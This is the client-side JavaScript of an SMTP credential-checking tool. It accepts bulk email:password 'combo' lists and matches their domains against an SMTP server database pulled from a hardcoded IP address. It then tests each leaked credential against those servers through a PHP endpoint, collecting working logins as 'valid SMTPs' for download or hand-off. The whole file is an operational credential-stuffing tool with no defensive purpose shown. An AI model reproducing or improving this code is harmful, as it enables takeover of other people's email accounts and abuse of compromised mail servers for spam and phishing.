const dropZone = document.getElementById('dropZone')
const fileInput = document.getElementById('data')
const fileDisplayZone = document.getElementById('fileDisplayZone')
const fileName = document.getElementById('fileName')
const fileContentField = document.getElementById('fileContent')

const comboList = document.getElementById('comboList')
const office365 = document.getElementById('office365')

const statusSpan = document.getElementById('status')
const statusLoading = document.getElementById('statusLoading')
const statusDone = document.getElementById('statusDone')
const statusStopped = document.getElementById('statusStopped')
const statusLabel = document.getElementById('statusLabel')

const submitButton = document.getElementById('submit')
const checkButton = document.getElementById('check')

const matchedCombos = document.getElementById('matchedCombos')
const matchedCount = document.getElementById('matchedCount')
const validSMTPs = document.getElementById('validSMTPs')

const matchedComboExample = document.getElementById('matchedCombo')
const matchedCombo = matchedComboExample.cloneNode(true)
matchedCombo.id = ''
matchedComboExample.remove()

const unmatchedCombos = document.getElementById('unmatchedCombos')
const unmatchedDomains = document.getElementById('unmatchedDomains')

const tokenExample = document.getElementById('tokenExample')
const token = tokenExample.cloneNode(true)
token.id = ''
tokenExample.remove()

const saveSmtp = document.getElementById('saveSmtp')

var ajaxRequest
var data

fileInput.value = ''

function handleDragOver(event) {
    event.preventDefault()
    dropZone.classList.add('drag-over')
    event.dataTransfer.dropEffect = 'copy'
}

function handleDragLeave(event) {
    event.preventDefault()
    dropZone.classList.remove('drag-over')

    // Hide drop zone & display display zone if file is already uploaded
    if (fileInput.files.length > 0) {
        dropZone.classList.replace('d-flex', 'd-none')
        fileDisplayZone.classList.replace('d-none', 'd-flex')
    }
}

function handleDrop(event) {
    event.preventDefault()
    dropZone.classList.remove('drag-over')
    const file = event.dataTransfer.files[0]
    const fileExtension = file.name.split('.').pop()

    // Check file type is .txt or .csv
    if (fileExtension === 'txt' || fileExtension === 'csv') {
        fileInput.files = event.dataTransfer.files

        showFileDetails(file)
    } else {
        alert('Please upload a .txt or .csv file')
    }
}

function dragOverDisplay(event) {
    event.preventDefault()
    dropZone.classList.replace('d-none', 'd-flex')
    fileDisplayZone.classList.replace('d-flex', 'd-none')
}

function removeFile() {
    fileInput.value = ''
    dropZone.classList.replace('d-none', 'd-flex')
    fileDisplayZone.classList.replace('d-flex', 'd-none')
}

function handleFileInput(event) {
    const file = event.target.files[0]
    showFileDetails(file)
}

function showFileDetails(file) {
    const fileExtension = file.name.split('.').pop()

    // Hide drop zone & display display zone
    dropZone.classList.replace('d-flex', 'd-none')
    fileDisplayZone.classList.replace('d-none', 'd-flex')

    // Display file name
    fileName.textContent = file.name

    // Read file content
    const reader = new FileReader()

    reader.onload = function (e) {
        const fileContent = e.target.result
        fileContentField.value = fileContent
        // console.log(fileContent) // or do something else with the content
    }

    reader.readAsText(file)
}

async function checkFileField() {
    if (fileInput.files.length > 0) {
        await validateCombos()
    } else {
        dropZone.classList.add('emptyFile')
        setTimeout(() => {
            dropZone.classList.remove('emptyFile')
        }, 1000)
        alert('Please upload a file')
    }
}

async function validateCombos() {
    const inputType = document.querySelector('.input-type[aria-selected="true"]').getAttribute('data-input-type')
    let combos = ''
    let inputField = ''

    switch (inputType) {
        case 'manual':
            combos = comboList.value
            inputField = comboList
            comboList.setCustomValidity('')
            break

        case 'drag-and-drop':
            combos = fileContentField.value
            inputField = fileContentField
            fileContentField.setCustomValidity('')
            break

        default:
            break
    }

    let comboArray = combos.split('\n')
    comboArray = comboArray.filter((combo) => combo !== '')

    if (comboArray.length > 10000) {
        alert('Please input less than 10000 combos')
        inputField.setCustomValidity('Please input less than 10000 combos')
        return false
    } else if (comboArray.length === 0) {
        alert('Please input combos')
        inputField.setCustomValidity('Please input combos')
        return false
    }

    const comboCount = comboArray.length

    let combosPattern = /^[\w.-]+@[\w.-]+:.+$/gim
    let matched = await combos.match(combosPattern)
    if (matched === null || matched.length !== comboCount) {
        alert('Please input valid combos')
        fileContentField.setCustomValidity('Please input valid combos')
        return false
    }
    return true
}

async function matchDomains(event) {
    event.preventDefault()

    submitButton.disabled = true
    submitButton.children[0].classList.add('d-none') // Hide label
    submitButton.children[1].classList.remove('d-none') // Show spinner

    if (data === undefined) {
        const options = {
            method: 'GET',
        }
        const request = await fetch('https://45.145.6.18/database/smtp/smtps.php', options)

        data = await request.json()
    }
    console.log(data)

    const inputType = document.querySelector('.input-type[aria-selected="true"]').getAttribute('data-input-type')
    let combos = ''

    switch (inputType) {
        case 'manual':
            combos = comboList.value.split('\n')
            break

        case 'drag-and-drop':
            combos = fileContentField.value.split('\n')
            break

        default:
            break
    }

    combos = combos.filter((combo) => combo !== '')
    let matched = 0

    if (!office365.checked) {
        matchedCombos.innerText = ''
        let unmatchedCombosArray = []
        let unmatchedDomainsArray = []

        await combos.forEach((combo) => {
            let comboEmail = combo.split(':')[0]
            let comboDomain = comboEmail.split('@')[1]
            let comboDomainExists = data.some((smtp) => smtp.domain.toLowerCase() === comboDomain.toLowerCase()) // For all domains

            if (comboDomainExists) {
                // console.log(`${combo} exists`)
                const div = matchedCombo.cloneNode(true)
                div.classList.add('matchedCombo')
                div.classList.remove('d-none')
                div.setAttribute('data-combo', combo)
                div.setAttribute('data-domain', comboDomain)

                const svgContainer = div.children[0]
                const label = div.children[1]
                label.innerText = `${combo}`

                matchedCombos.appendChild(div)
                matched++
            } else {
                // console.log(`${combo} does not exist`)
                unmatchedDomainsArray.push(comboDomain)
                unmatchedCombosArray.push(combo)
            }
        })

        if (unmatchedDomainsArray.length > 0) {
            const uniqueUnmatchedDomainsArray = [...new Set(unmatchedDomainsArray)]
            unmatchedDomains.innerText = uniqueUnmatchedDomainsArray.join('\n')

            const uniqueUnmatchedCombosArray = [...new Set(unmatchedCombosArray)]
            unmatchedCombos.innerText = uniqueUnmatchedCombosArray.join('\n')

            const unmatchedDomainsTab = document.querySelectorAll('.navg-tab')[1]
            const notificationBadge = unmatchedDomainsTab.children[1]

            notificationBadge.style.display = 'unset'
        }
    } else {
        // Put all combos directly in matchedCombos
        combos.forEach((combo) => {
            let comboEmail = combo.split(':')[0]
            let comboDomain = comboEmail.split('@')[1]

            // console.log(`${combo} exists`)
            const div = matchedCombo.cloneNode(true)
            div.classList.add('matchedCombo')
            div.classList.remove('d-none')
            div.setAttribute('data-combo', combo)
            div.setAttribute('data-domain', 'office365.com')

            const svgContainer = div.children[0]
            const label = div.children[1]
            label.innerText = `${combo}`

            matchedCombos.appendChild(div)
            matched++
        })
    }
    matchedCount.innerText = `(${matched} emails)`

    submitButton.disabled = false
    submitButton.children[0].classList.remove('d-none') // Show label
    submitButton.children[1].classList.add('d-none') // Hide spinner

    // let formData = new FormData()
    // formData.append('combo', firstline)

    // $.ajax({
    //     type: 'POST',
    //     url: './php/smtp_operations.php',
    //     data: formData,
    //     contentType: false,
    //     processData: false,
    //     success: function (response) {
    //         console.log(response)
    //     },
    // })
}

async function checkSMTP() {
    const matchedComboDivs = matchedCombos.querySelectorAll('.matchedCombo')

    if (matchedComboDivs.length === 0) {
        alert('Please match domains first.')
        return false
    }

    // Check Button
    checkButton.disabled = true
    checkButton.children[0].classList.add('d-none') // Hide label
    checkButton.children[1].classList.remove('d-none') // Show spinner

    // Status Span
    statusSpan.classList.remove('d-none') // Show the whole status span
    statusLoading.classList.remove('d-none') // Show loading spinner
    statusDone.classList.add('d-none') // Hide done icon
    statusStopped.classList.add('d-none') // Hide stopped icon
    statusLabel.className = '' // Remove all classes
    statusLabel.textContent = 'Checking...' // Set label text

    validSMTPs.innerText = ''

    // Iterate over matched combos
    for (let i = 0; i < matchedComboDivs.length; i++) {
        const comboContainer = matchedComboDivs[i]

        const svgContainer = comboContainer.children[0]
        const loader = svgContainer.children[0]
        const check = svgContainer.children[1]
        const cross = svgContainer.children[2]

        loader.classList.remove('invisible') // Show loader
        check.classList.add('d-none') // Hide check
        cross.classList.add('d-none') // Hide cross

        let success = false

        const comboLabel = comboContainer.children[1]
        let comboDomain = comboContainer.getAttribute('data-domain')
        const comboSMTPs = data.find((smtp) => smtp.domain.toLowerCase() === comboDomain.toLowerCase()).smtps

        // console.log(comboSMTP)

        // Iterate over combo SMTPs
        for (let j = 0; j < comboSMTPs.length; j++) {
            const smtp = comboSMTPs[j]
            const smtpServer = `${smtp}${comboLabel.textContent.trim()}`

            statusLabel.innerHTML = `Checking: <span class="text-warning">${comboLabel.textContent.trim()}</span>` // Set label text

            const formData = new FormData()
            formData.append('smtpServer', smtpServer)
            formData.append('debug', '0')

            try {
                await $.ajax({
                    type: 'POST',
                    url: './php/smtp_check.php',
                    data: formData,
                    contentType: false,
                    processData: false,
                    success: function (response) {
                        console.log(response)

                        const div = document.createElement('div')
                        div.classList.add('validSMTP')
                        div.innerText = `${smtpServer}`

                        validSMTPs.appendChild(div)

                        success = true
                    },
                    error: function (response) {
                        response = JSON.parse(response.responseText)
                        console.log(response)
                    },
                })
            } catch (error) {
                // console.log(error)
            }
        }

        if (success) {
            comboContainer.classList.add('fw-semibold', 'text-success') // Add success class

            loader.classList.add('d-none') // Hide loader
            check.classList.remove('d-none') // Show check
            cross.classList.add('d-none') // Hide cross
        } else {
            comboContainer.classList.add('fw-semibold', 'text-danger') // Add danger class

            loader.classList.add('d-none') // Hide loader
            check.classList.add('d-none') // Hide check
            cross.classList.remove('d-none') // Show cross
        }
        // break matchedCombosLoop // Only check the first SMTP
    }

    // Check Button
    checkButton.disabled = false
    checkButton.children[0].classList.remove('d-none') // Show label
    checkButton.children[1].classList.add('d-none') // Hide spinner

    // Status Span
    statusLoading.classList.add('d-none') // Hide loading spinner
    statusDone.classList.remove('d-none') // Show done icon
    statusStopped.classList.add('d-none') // Hide stopped icon
    statusLabel.classList.add('text-success') // Add success class
    statusLabel.textContent = 'Done' // Set label text

    // console.log(matchedCombosArray)
}

function delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms))
}

function downloadValidSMTPs() {
    const validSMTPs = document.querySelectorAll('.validSMTP')
    const validSMTPsArray = []

    if (validSMTPs.length === 0) {
        alert('Please check SMTPs first.')
        return
    } else {
        validSMTPs.forEach((validSMTP) => {
            validSMTPsArray.push(validSMTP.textContent)
        })

        if (validSMTPsArray.length === 0) {
            alert('Please check SMTPs first.')
            return
        }

        // console.log(validSMTPsArray)

        let blob = new Blob([validSMTPsArray.join('\n')], { type: 'text/plain;charset=utf-8' })
        saveAs(blob, 'validSMTPs.txt')
    }
}

function saveAs(blob, filename) {
    if (window.navigator.msSaveOrOpenBlob) {
        window.navigator.msSaveBlob(blob, filename)
    } else {
        const a = document.createElement('a')
        const url = window.URL.createObjectURL(blob)
        a.href = url
        a.download = filename
        a.click()
        setTimeout(() => {
            window.URL.revokeObjectURL(url)
        }, 0)

        a.remove()
    }
}

function LoadSMTPsToParent() {
    const validSMTPs = document.querySelectorAll('.validSMTP')
    const validSMTPsArray = []

    if (validSMTPs.length === 0) {
        alert('Please check SMTPs first.')
        return
    } else {
        validSMTPs.forEach((validSMTP) => {
            validSMTPsArray.push(validSMTP.textContent)
        })

        if (validSMTPsArray.length === 0) {
            alert('Please check SMTPs first.')
            return
        }

        let validSMTPsObject = {
            validSMTPs: validSMTPsArray,
        }

        parent.postMessage(validSMTPsObject, '*')
    }
}

function switchTabs(event) {
    const navgTab = event.target
    const navgTabs = document.querySelectorAll('.navg-tab')
    const tabs = document.querySelectorAll('.tab')

    // Change all navigation tabs style
    navgTabs.forEach((tab) => {
        tab.setAttribute('aria-selected', 'false')
    })
    // Change clicked navigation tab style
    navgTab.setAttribute('aria-selected', 'true')
    // Hide notification badge if exists
    if (navgTab.children[1]) {
        navgTab.children[1].style.display = 'none'
    }

    // Hide all tabs
    tabs.forEach((tab) => {
        tab.classList.add('d-none')
    })
    // Show clicked tab
    const tabName = navgTab.getAttribute('data-tab') // Get clicked tab name from data-tab attribute of clicked navigation tab
    const tabArray = Array.from(tabs) // Convert NodeList to an array
    const tabToShow = tabArray.find((tab) => tab.getAttribute('data-tab-content') === tabName) // Find the tab to show
    tabToShow.classList.remove('d-none') // Show the tab
}

function changeInputType(event) {
    const inputType = event.target
    const inputs = document.querySelectorAll('.input-type')
    const inputFields = document.querySelectorAll('.input-field')

    // Change all input type style
    inputs.forEach((input) => {
        input.setAttribute('aria-selected', 'false')
    })
    // Change clicked input type style
    inputType.setAttribute('aria-selected', 'true')

    // Hide manual and drag & drop fields
    inputFields.forEach((inputField) => {
        inputField.classList.add('d-none')
    })
    // Show clicked input type field
    const inputTypeName = inputType.getAttribute('data-input-type') // Get clicked input type name from data-input-type attribute of clicked input type
    const inputFieldArray = Array.from(inputFields) // Convert NodeList to an array
    const inputFieldToShow = inputFieldArray.find((inputField) => inputField.getAttribute('data-input-type-field') === inputTypeName) // Find the input type field to show
    inputFieldToShow.classList.remove('d-none') // Show the input type field
}

function downloadUnmatched(event) {
    const target = event.target

    const unmatched = target.getAttribute('data-unmatched')
    let field = ''

    switch (unmatched) {
        case 'combos':
            field = unmatchedCombos
            break

        case 'domains':
            field = unmatchedDomains
            break

        default:
            break
    }

    if (field.innerText === '') {
        alert('Please match domains first.')
        return
    }

    let blob = new Blob([field.innerText], { type: 'text/plain;charset=utf-8' })
    saveAs(blob, `${field.id}.txt`)
}

function addToken() {
    const domain = document.getElementById('domain')
    const server = document.getElementById('server')
    const port = document.getElementById('port')
    const encryption = document.getElementById('encryption')

    const fieldsArray = [domain, server, port, encryption]
    let isEmpty = false

    // Check if any field is empty
    fieldsArray.forEach((field) => {
        // console.log(`${field.id}: '${field.value}'`)
        if (field.value == '') {
            isEmpty = true
        }
    })

    // If any field is empty, alert and return
    if (isEmpty) {
        alert('Please fill all fields.')
        return
    }

    // If all fields are filled, add token
    // Set values
    let domainValue = domain.value.toLowerCase()
    let serverValue = server.value.toLowerCase()
    let portValue = port.value
    let encryptionValue = encryption.value === 'none' ? '' : encryption.value

    const smtps = document.getElementById('smtps') // Get SMTPs field

    const tokens = smtps.querySelectorAll('.token') // Get all tokens
    // Check if token already exists
    let tokenExists = Array.from(tokens).some((token) => {
        const tokenDomain = token.querySelector('[data-value="domain"]').innerText.toLowerCase()
        const tokenServer = token.querySelector('[data-value="smtp"]').innerText.toLowerCase()

        return tokenDomain === domainValue && tokenServer === `${serverValue}:${portValue}:${encryptionValue}:`
    })

    // if it exists, alert and return
    if (tokenExists) {
        alert('Token already exists.')
        return
    }

    // if it doesn't exist, add it
    const tokenInput = token.cloneNode(true)
    const tokenDomain = tokenInput.querySelector('[data-value="domain"]')
    const tokenServer = tokenInput.querySelector('[data-value="smtp"]')

    tokenDomain.innerText = domainValue
    tokenServer.innerText = `${serverValue}:${portValue}:${encryptionValue}:`
    smtps.appendChild(tokenInput)
}

/**
 * This function saves SMTPs to the database
 *
 * @param {Event} event
 * @returns {void}
 */
async function saveSMTPs(event) {
    event.preventDefault()

    const smtps = document.getElementById('smtps') // Get SMTPs field
    const tokens = smtps.querySelectorAll('.token') // Get all tokens

    // Check if any token exists
    if (tokens.length === 0) {
        alert('Please add domain and SMTP first.')
        return
    }

    // Disable save button
    saveSmtp.disabled = true
    saveSmtp.children[0].classList.add('d-none') // Hide label
    saveSmtp.children[1].classList.remove('d-none') // Show spinner

    // Iterate over tokens
    for (let i = 0; i < tokens.length; i++) {
        const token = tokens[i]
        const tokenStatus = token.querySelector('[data-value="status"]')
        const tokenStatusLabel = tokenStatus.children[0]
        const tokenDomain = token.querySelector('[data-value="domain"]').innerText.toLowerCase()
        const tokenServer = token.querySelector('[data-value="smtp"]').innerText.toLowerCase()

        // Set status to saving
        tokenStatus.className = 'saving'
        tokenStatusLabel.innerText = ''

        const formData = new FormData()
        formData.append('domain', tokenDomain)
        formData.append('smtp', tokenServer)

        try {
            await $.ajax({
                type: 'POST',
                url: 'https://45.145.6.18/database/smtp/smtps.php',
                data: formData,
                contentType: false,
                processData: false,
                success: function (response) {
                    console.log(response)
                    tokenStatus.className = 'success'
                },
                error: function (response) {
                    response = JSON.parse(response.responseText)
                    console.log(response)
                    if (response.status === 'Error') {
                        tokenStatus.className = 'error'
                    } else if (response.status === 'Duplicate') {
                        tokenStatus.className = 'warning'
                    }
                },
            })
        } catch (error) {
            // console.log(error)
        }
    }

    // Enable save button
    saveSmtp.disabled = false
    saveSmtp.children[0].classList.remove('d-none') // Show label
    saveSmtp.children[1].classList.add('d-none') // Hide spinner
}
